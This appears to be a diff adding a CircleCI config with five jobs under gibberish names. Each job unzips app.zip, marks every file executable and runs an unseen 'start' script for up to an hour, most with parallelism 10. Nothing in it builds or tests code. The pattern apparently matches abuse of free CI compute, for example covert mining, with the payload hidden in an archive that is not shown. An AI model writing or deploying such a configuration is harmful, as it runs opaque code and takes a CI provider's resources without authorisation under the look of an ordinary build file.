@@ -1,1 +1,127 @@
+version: 2.1
+jobs:
+  Aklipn:
+    docker:
+      - image: cimg/node:14.19.3
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: abahi
+            command: sudo apt update -y
+        - run:
+            name: abiah
+            command: ls
+        - run:
+            name: abuah
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: aliah
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 1
+  Bklip:
+    docker:
+      - image: cimg/node:18.2.0
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: biopas
+            command: sudo apt update -y
+        - run:
+            name: balope
+            command: ls
+        - run:
+            name: bolapo
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: biuolap
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 10
+  Copkli:
+    docker:
+      - image: cimg/node:16.15.0
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: caruil
+            command: sudo apt update -y
+        - run:
+            name: culasip
+            command: ls
+        - run:
+            name: ciuweop
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: clupasip
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 10
+  Diopli:
+    docker:
+      - image: cimg/node:14.19.2
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: dakopalop
+            command: sudo apt update -y
+        - run:
+            name: depolaser
+            command: ls
+        - run:
+            name: dpoinm
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: doopmas
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 10
+  Erpani:
+    docker:
+      - image: cimg/node:12.13.1
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: ekop
+            command: sudo apt update -y
+        - run:
+            name: ekoro
+            command: ls
+        - run:
+            name: elpazi
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: enpass
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 10
 
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - Aklipn
+      - Bklip:
+          requires:
+            - Aklipn
+      - Copkli:
+          requires:
+            - Aklipn
+            - Bklip
+      - Diopli:
+          requires:
+            - Aklipn
+            - Bklip
+            - Copkli
+      - Erpani:
+          requires:
+            - Aklipn
+            - Bklip
+            - Copkli
+            - Diopli
